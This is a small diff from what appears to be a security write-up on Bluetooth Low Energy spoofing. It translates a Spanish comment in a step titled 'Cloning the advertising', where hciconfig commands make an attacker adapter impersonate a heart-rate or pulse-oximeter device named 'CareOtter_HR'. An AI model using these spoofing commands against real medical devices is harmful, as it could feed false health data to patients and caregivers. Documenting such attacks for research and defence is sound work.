@@ -379,7 +379,7 @@ sudo hcitool lescan --duplicates
 #### Step 2: Cloning the advertising
 Using any BLE interface (CSR 4.0 dongle, Raspberry Pi, nRF52840):
 ```bash
-# Configurar el adaptador atacante con el mismo nombre y clase de dispositivo médico
+# Configure the attacker adapter with the same name and medical device class
 sudo hciconfig hci0 name "CareOtter_HR"
 sudo hciconfig hci0 class 0x7A0440  # Medical/Pulse Oximeter/Heart Rate Monitor
 sudo hciconfig hci0 leadv 0          # Start advertising
